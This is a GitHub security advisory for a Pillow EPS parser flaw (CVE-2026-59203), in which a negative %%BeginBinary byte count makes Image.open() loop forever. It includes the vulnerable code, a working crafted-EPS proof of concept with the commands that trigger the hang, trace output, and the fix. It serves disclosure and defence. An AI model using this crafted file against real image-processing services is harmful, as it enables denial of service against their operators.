# [M] Pillow EpsImagePlugin negative %%BeginBinary byte count causes infinite loop denial of service

## Summary
Severity: Medium
Advisory: GHSA-pg7v-jwj7-p798
CVE: CVE-2026-59203
CWE: CWE-835
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-pg7v-jwj7-p798
Type: github-advisory

## Affected
- PyPI: `pillow` — affected >=12.0.0 <12.3.0

## Details
### Summary

Pillow's EPS parser (PIL/EpsImagePlugin.py) accepts a negative byte count in the %%BeginBinary directive. A crafted EPS file can cause Image.open() to seek backwards to the same directive and parse it repeatedly, resulting in an infinite loop and CPU denial of service.

The issue is triggered during Image.open(), does not require Image.load(), and does not require Ghostscript execution.

Confirmed affected versions: Pillow 12.0.0 through 12.2.0.

### Details

The issue is in the EPS parser in PIL/EpsImagePlugin.py. When parsing an EPS %%BeginBinary directive, Pillow reads the byte count from the file and passes it directly to a relative seek operation without validating that the value is non-negative.

Relevant code:

    elif bytes_mv[:14] == b"%%BeginBinary:":
        bytecount = int(byte_arr[14:bytes_read])
        self.fp.seek(bytecount, os.SEEK_CUR)

There is no validation that bytecount is non-negative.

If an attacker provides a negative value such as %%BeginBinary:-18, the parser moves the file pointer backwards from the end of the directive line to the same line region. The next parser iteration reads the same %%BeginBinary:-18 directive again, performs the same backward seek, and repeats indefinitely. This causes Image.open() to hang in an infinite loop and consume CPU.

In local testing, the issue is present in Pillow 12.0.0, 12.1.0, 12.1.1, and 12.2.0. Pillow 11.3.0 did not hang with the same PoC, so this appears to affect the 12.x EPS parsing path.

### PoC

Save the following content as pillow_eps_beginbinary_dos.eps:

    %!PS-Adobe-3.0 EPSF-3.0
    %%BoundingBox: 0 0 1 1
    %%EndComments
    % dummy comment after transition
    %%BeginBinary:-18
    %%EOF

Then run:

    python -m pip install "Pillow==12.2.0"

    python - <<'PY'
    from PIL import Image
    Image.open("pillow_eps_beginbinary_dos.eps")
    PY

Expected behavior: Pillow should reject the malformed EPS file with a parser exception.

Actual behavior: the process does not return. It hangs inside Image.open() and continuously consumes CPU.

The loop behavior can be observed by tracing the parser state. The file pointer repeatedly seeks from position 112 back to 94, causing the same %%BeginBinary:-18 line to be parsed again and again:

    LINE b'%%BeginBinary:-18' pos_after_newline 112
    BeginBinary bytecount -18 seek from 112 to 94
    LINE b'%%BeginBinary:-18' pos_after_newline 112
    BeginBinary bytecount -18 seek from 112 to 94
    LINE b'%%BeginBinary:-18' pos_after_newline 112
    BeginBinary bytecount -18 seek from 112 to 94

### Impact

This is a denial-of-service vulnerability. An attacker who can provide an EPS file to an application using Pillow for image validation, metadata parsing, previews, uploads, or batch image processing can cause the image parsing process to hang during Image.open().

This can impact web services and backend workers that parse untrusted image files, especially if image parsing is performed in a main worker process without CPU limits, timeouts, or process isolation. The issue does not require Ghostscript execution and does not require calling Image.load(), so applications that only use Image.open() to validate or identify uploaded images may still be affected.

Suggested fix: validate the parsed %%BeginBinary byte count before seeking. If the byte count is negative, reject the file with a parsing exception instead of calling self.fp.seek(bytecount, os.SEEK_CUR).

## References
- https://github.com/python-pillow/Pillow/security/advisories/GHSA-pg7v-jwj7-p798
- https://nvd.nist.gov/vuln/detail/CVE-2026-59203
- https://github.com/python-pillow/Pillow/pull/9708
- https://github.com/python-pillow/Pillow/commit/03992618118b4a76b6163cd72ab5ecd684133b83
- https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-3452.yaml
- https://github.com/python-pillow/Pillow
- https://github.com/python-pillow/Pillow/releases/tag/12.3.0
